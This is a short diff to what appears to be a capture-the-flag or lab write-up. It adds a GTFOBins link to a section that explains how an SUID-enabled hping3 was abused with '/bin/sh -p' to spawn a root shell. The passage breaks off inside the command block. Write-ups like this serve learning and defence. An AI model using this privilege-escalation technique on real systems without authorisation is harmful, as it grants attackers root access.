@@ -95,6 +95,8 @@ Found local.txt in /var/www
 
 Enumerating SUID binaries on the system revealed that `hping3` had the SUID bit set. By abusing its interactive shell feature via GTFOBins (`hping3` followed by `/bin/sh -p`), I spawned a root shell.
 
+#### PoC- [https://gtfobins.org/gtfobins/hping3/](https://gtfobins.org/gtfobins/hping3/)
+
 ```
 Command:- hping3 
           /bin/sh -p 
